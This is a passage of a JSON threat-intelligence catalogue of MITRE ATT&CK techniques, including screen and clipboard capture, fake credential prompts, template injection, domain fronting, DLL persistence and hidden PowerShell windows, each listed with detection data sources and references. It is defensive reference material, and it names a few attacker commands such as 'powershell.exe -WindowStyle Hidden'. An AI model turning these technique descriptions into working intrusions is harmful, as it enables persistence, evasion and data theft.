          "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
          "https://technet.microsoft.com/en-us/library/dn408187.aspx"
        ]
      },
      "uuid": "52d40641-c480-4ad5-81a3-c80ccaddf82d",
      "value": "Authentication Package - T1131"
    },
    {
      "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.\n\n### Mac\n\nOn OSX, the native command <code>screencapture</code> is used to capture screenshots.\n\n### Linux\n\nOn Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)",
      "meta": {
        "external_id": "CAPEC-648",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1113",
          "https://capec.mitre.org/data/definitions/648.html",
          "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"
        ]
      },
      "uuid": "0259baeb-9f63-4c69-bf10-eb038c390688",
      "value": "Screen Capture - T1113"
    },
    {
      "description": "Dynamic DNS is a method of automatically updating a name in the DNS system. Providers offer this rapid reconfiguration of IPs to hostnames as a service. (Citation: DellMirage2012)",
      "meta": {
        "external_id": "T1311",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1311"
        ]
      },
      "related": [
        {
          "dest-uuid": "54eb2bab-125f-4d1c-b999-0c692860bafe",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "20a66013-8dab-4ca3-a67d-766c842c561c",
      "value": "Dynamic DNS - T1311"
    },
    {
      "description": "Adversaries may target user email to collect sensitive information from a target.\n\nFiles containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.\n\nAdversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific key words.(Citation: Black Hills MailSniper, 2017)\n\n### Email Forwarding Rule\n\nAdversaries may also abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: TIMMCMIC, 2014)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. ",
      "meta": {
        "external_id": "T1114",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "Office 365 trace logs",
          "Mail server",
          "Email gateway",
          "Authentication logs",
          "File monitoring",
          "Process monitoring",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Windows",
          "Office 365"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1114",
          "https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/",
          "https://www.us-cert.gov/ncas/alerts/TA18-086A",
          "https://blogs.technet.microsoft.com/timmcmic/2014/07/28/exchange-and-office-365-mail-forwarding/",
          "https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/"
        ]
      },
      "uuid": "1608f3e1-598a-42f4-a01a-2e252e81728f",
      "value": "Email Collection - T1114"
    },
    {
      "description": "The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Adversaries may mimic this functionality to prompt users for sensitive information.\n\nCompared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique’s use.(Citation: Felt-PhishingOnMobileDevices)\n\nSpecific approaches to this technique include:\n\n### Impersonate the identity of a legitimate application\n\nA malicious application could impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and get installed on the device. The malicious app could then prompt the user for sensitive information.(Citation: eset-finance)\n\n### Display a prompt on top of a running legitimate application\n\nA malicious application could display a prompt on top of a running legitimate application to trick users into entering sensitive information into the malicious application rather than the legitimate application. Typically, the malicious application would need to know when the targeted application (and individual activity within the targeted application) is running in the foreground, so that the malicious application knows when to display its prompt. Android 5.0 and 5.1.1, respectively, increased the difficulty of determining the current foreground application through modifications to the `ActivityManager` API.(Citation: Android-getRunningTasks)(Citation: StackOverflow-getRunningAppProcesses). A malicious application can still abuse Android’s accessibility features to determine which application is currently in the foreground.(Citation: ThreatFabric Cerberus) Approaches to display a prompt include:\n\n* A malicious application could start a new activity on top of a running legitimate application.(Citation: Felt-PhishingOnMobileDevices)(Citation: Hassell-ExploitingAndroid) Android 10 places new restrictions on the ability for an application to start a new activity on top of another application, which may make it more difficult for adversaries to utilize this technique.(Citation: Android Background)\n* A malicious application could create an application overlay window on top of a running legitimate application. Applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows. This permission is handled differently than typical Android permissions, and at least under certain conditions is automatically granted to applications installed from the Google Play Store.(Citation: Cloak and Dagger)(Citation: NowSecure Android Overlay)(Citation: Skycure-Accessibility) The `SYSTEM_ALERT_WINDOW` permission and its associated ability to create application overlay windows are expected to be deprecated in a future release of Android in favor of a new API.(Citation: XDA Bubbles)\n\n### Fake device notifications\n\nA malicious application could send fake device notifications to the user. Clicking on the device notification could trigger the malicious application to display an input prompt.(Citation: Group IB Gustuff Mar 2019)",
      "meta": {
        "external_id": "APP-31",
        "kill_chain": [
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1411",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-31.html",
          "http://w2spconf.com/2011/papers/felt-mobilephishing.pdf",
          "https://www.welivesecurity.com/2018/09/19/fake-finance-apps-google-play-target-around-world/",
          "https://developer.android.com/reference/android/app/ActivityManager.html#getRunningTasks%28int%29",
          "http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag",
          "https://www.threatfabric.com/blogs/cerberus-a-new-banking-trojan-from-the-underworld.html",
          "https://conference.hitb.org/hitbsecconf2011kul/materials/D1T1%20-%20Riley%20Hassell%20-%20Exploiting%20Androids%20for%20Fun%20and%20Profit.pdf",
          "https://developer.android.com/guide/components/activities/background-starts",
          "http://cloak-and-dagger.org/",
          "https://www.nowsecure.com/blog/2017/05/25/android-overlay-malware-system-alert-window-permission/",
          "https://www.skycure.com/blog/accessibility-clickjacking/",
          "https://www.xda-developers.com/android-q-system-alert-window-deprecate-bubbles/",
          "https://www.group-ib.com/blog/gustuff"
        ]
      },
      "uuid": "3dd58c80-4c2e-458c-9503-1b2cd273c4d2",
      "value": "Input Prompt - T1411"
    },
    {
      "description": "When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and [PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).",
      "meta": {
        "external_id": "CAPEC-569",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "User interface",
          "PowerShell logs"
        ],
        "mitre_platforms": [
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1141",
          "https://capec.mitre.org/data/definitions/569.html",
          "https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html",
          "https://logrhythm.com/blog/do-you-trust-your-computer/",
          "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
          "https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/"
        ]
      },
      "uuid": "91ce1ede-107f-4d8b-bf4c-735e8789c94b",
      "value": "Input Prompt - T1141"
    },
    {
      "description": "Adversaries may collect data stored in the Windows clipboard from users copying information within or between applications. \n\n### Windows\n\nApplications can access clipboard data by using the Windows API. (Citation: MSDN Clipboard) \n\n### Mac\n\nOSX provides a native command, <code>pbpaste</code>, to grab clipboard contents  (Citation: Operating with EmPyre).",
      "meta": {
        "external_id": "CAPEC-637",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "API monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1115",
          "https://capec.mitre.org/data/definitions/637.html",
          "https://msdn.microsoft.com/en-us/library/ms649012",
          "http://www.rvrsh3ll.net/blog/empyre/operating-with-empyre/"
        ]
      },
      "uuid": "30973a08-aed9-4edf-8604-9084ce1b5c4f",
      "value": "Clipboard Data - T1115"
    },
    {
      "description": "Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time (Citation: Malware Persistence on OS X).",
      "meta": {
        "external_id": "T1161",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Binary file metadata",
          "Process monitoring",
          "Process command-line parameters",
          "File monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1161",
          "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
          "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf"
        ]
      },
      "uuid": "04ef4356-8926-45e2-9441-634b6f3dcecb",
      "value": "LC_LOAD_DYLIB Addition - T1161"
    },
    {
      "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "meta": {
        "external_id": "T1116",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1116",
          "https://en.wikipedia.org/wiki/Code_signing",
          "https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/",
          "http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates",
          "http://www.thesafemac.com/new-signed-malware-called-janicab/"
        ]
      },
      "uuid": "1b84d551-6de8-4b96-9930-d177677c3b1d",
      "value": "Code Signing - T1116"
    },
    {
      "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File Copy](https://attack.mitre.org/techniques/T1105) to identify and move files.",
      "meta": {
        "external_id": "T1119",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Data loss prevention",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1119"
        ]
      },
      "uuid": "30208d3e-0d6b-43c8-883e-44462a514619",
      "value": "Automated Collection - T1119"
    },
    {
      "description": "Microsoft’s Open Office XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents (i.e. [Scripting](https://attack.mitre.org/techniques/T1064)). Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)",
      "meta": {
        "external_id": "T1221",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Anti-virus",
          "Email gateway",
          "Network intrusion detection system",
          "Web logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1221",
          "https://docs.microsoft.com/previous-versions/office/developer/office-2007/aa338205(v=office.12)",
          "https://www.sans.org/reading-room/whitepapers/testing/template-injection-attacks-bypassing-security-controls-living-land-38780",
          "http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html",
          "https://blog.malwarebytes.com/threat-analysis/2017/10/decoy-microsoft-word-document-delivers-malware-through-rat/",
          "https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104",
          "https://blog.talosintelligence.com/2017/07/template-injection.html",
          "https://github.com/ryhanson/phishery"
        ]
      },
      "uuid": "dc31fe1e-d722-49da-8f5f-92c7b5aff534",
      "value": "Template Injection - T1221"
    },
    {
      "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
      "meta": {
        "external_id": "CAPEC-634",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1123",
          "https://capec.mitre.org/data/definitions/634.html"
        ]
      },
      "uuid": "1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
      "value": "Audio Capture - T1123"
    },
    {
      "description": "Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
      "meta": {
        "external_id": "T1132",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Process use of network",
          "Process monitoring",
          "Network protocol analysis"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1132",
          "https://en.wikipedia.org/wiki/Binary-to-text_encoding",
          "https://en.wikipedia.org/wiki/Character_encoding",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f",
      "value": "Data Encoding - T1132"
    },
    {
      "description": "Adversaries may utilize the camera to capture information about the user, their surroundings, or other physical identifiers. Adversaries may use the physical camera devices on a mobile device to capture images or video. By default, in Android and iOS, an application must request permission to access a camera device which is granted by the user through a request prompt. In Android, applications must hold the `android.permission.CAMERA` permission to access the camera. In iOS, applications must include the `NSCameraUsageDescription` key in the `Info.plist` file, and must request access to the camera at runtime.",
      "meta": {
        "external_id": "APP-19",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1512",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-19.html"
        ]
      },
      "uuid": "d8940e76-f9c1-4912-bea6-e21c251370b6",
      "value": "Capture Camera - T1512"
    },
    {
      "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",
      "meta": {
        "external_id": "CAPEC-634",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "File monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1125",
          "https://capec.mitre.org/data/definitions/634.html",
          "https://objective-see.com/blog/blog_0x25.html"
        ]
      },
      "uuid": "6faf650d-bf31-4eb4-802d-1000cf38efaf",
      "value": "Video Capture - T1125"
    },
    {
      "description": "MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them (Citation: Adding Login Items). Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). These login items are stored in the user's <code>~/Library/Preferences/</code> directory in a plist file called <code>com.apple.loginitems.plist</code> (Citation: Methods of Mac Malware Persistence). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ‘Hide’ the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> SMLoginItemSetEnabled </code> can be used to set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1155) can do this as well  (Citation: Adding Login Items).",
      "meta": {
        "external_id": "CAPEC-564",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1162",
          "https://capec.mitre.org/data/definitions/564.html",
          "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
          "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
          "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/"
        ]
      },
      "uuid": "36675cd3-fe00-454c-8516-aebecacbe9d9",
      "value": "Login Item - T1162"
    },
    {
      "description": "Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
      "meta": {
        "external_id": "T1172",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "SSL/TLS inspection",
          "Packet capture"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1172",
          "http://www.icir.org/vern/papers/meek-PETS-2015.pdf"
        ]
      },
      "uuid": "1ce03c65-5946-4ac9-9d4d-66db87e024bd",
      "value": "Domain Fronting - T1172"
    },
    {
      "description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. (Citation: Endgame Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.",
      "meta": {
        "external_id": "T1182",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Loaded DLLs",
          "Process monitoring",
          "Windows Registry"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1182",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902",
          "https://forum.sysinternals.com/appcertdlls_topic12546.html"
        ]
      },
      "uuid": "4bf5845d-a814-4490-bc5c-ccdee6043025",
      "value": "AppCert DLLs - T1182"
    },
    {
      "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
      "meta": {
        "external_id": "CAPEC-163",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Web proxy",
          "Email gateway",
          "Detonation chamber",
          "SSL/TLS inspection",
          "DNS records",
          "Mail server"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS",
          "Linux",
          "Office 365",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1192",
          "https://capec.mitre.org/data/definitions/163.html",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks"
        ]
      },
      "uuid": "20138b9d-1aac-4a26-8654-a36b6bbf2bba",
      "value": "Spearphishing Link - T1192"
    },
    {
      "description": "Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. (Citation: FireEyeAPT17)",
      "meta": {
        "external_id": "T1331",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1331"
        ]
      },
      "related": [
        {
          "dest-uuid": "e6ca2820-a564-4b74-b42a-b6bdf052e5b6",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "72c8d526-1247-42d4-919c-6d7a31ca8f39",
      "value": "Obfuscate infrastructure - T1331"
    },
    {
      "description": "Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\n### Windows\nThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)\n\n### Mac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)\n",
      "meta": {
        "external_id": "T1143",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Windows event logs",
          "PowerShell logs",
          "Process command-line parameters",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1143",
          "https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1",
          "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"
        ]
      },
      "uuid": "04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf",
      "value": "Hidden Window - T1143"
    },
    {
      "description": "Adversaries may use screen captures to collect information about applications running in the foreground, capture user data, credentials, or other sensitive information. Applications running in the background can capture screenshots or videos of another application running in the foreground by using the Android `MediaProjectionManager` (generally requires the device user to grant consent).(Citation: Fortinet screencap July 2019)(Citation: Android ScreenCap1 2019) Background applications can also use Android accessibility services to capture screen contents being displayed by a foreground application.(Citation: Lookout-Monokle) An adversary with root access or Android Debug Bridge (adb) access could call the Android `screencap` or `screenrecord` commands.(Citation: Android ScreenCap2 2019)(Citation: Trend Micro ScreenCap July 2015)",
      "meta": {
        "external_id": "APP-40",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1513",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-40.html",
          "https://www.fortinet.com/blog/threat-research/new-wave-bianlian-malware.html",
          "https://developer.android.com/reference/android/media/projection/MediaProjectionManager",
          "https://www.lookout.com/documents/threat-reports/lookout-discovers-monokle-threat-report.pdf",
          "https://developer.android.com/studio/command-line/adb",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/hacking-team-rcsandroid-spying-tool-listens-to-calls-roots-devices-to-get-in/"
        ]
      },
      "uuid": "73c26732-6422-4081-8b63-6d0ae93d449e",
      "value": "Screen Capture - T1513"
    },
    {
      "description": "Adversaries with a sufficient level of access may create a local system, domain, or cloud tenant account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.\n\nIn cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.\n\n### Windows\n\nThe <code>net user</code> commands can be used to create a local or domain account.\n\n### Office 365\n\nAn adversary with access to a Global Admin account can create another account and assign it the Global Admin role for persistent access to the Office 365 tenant.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)",
      "meta": {
        "external_id": "T1136",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Office 365 account logs",
          "Azure activity logs",
          "AWS CloudTrail logs",
          "Process monitoring",
          "Process command-line parameters",
          "Authentication logs",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure AD",
          "Azure",
          "Office 365"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1136",
          "https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide",
          "https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d",
          "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720"
        ]
      },
      "uuid": "e01be9c5-e763-4caf-aeb7-000b416aef67",
      "value": "Create Account - T1136"
    },
    {
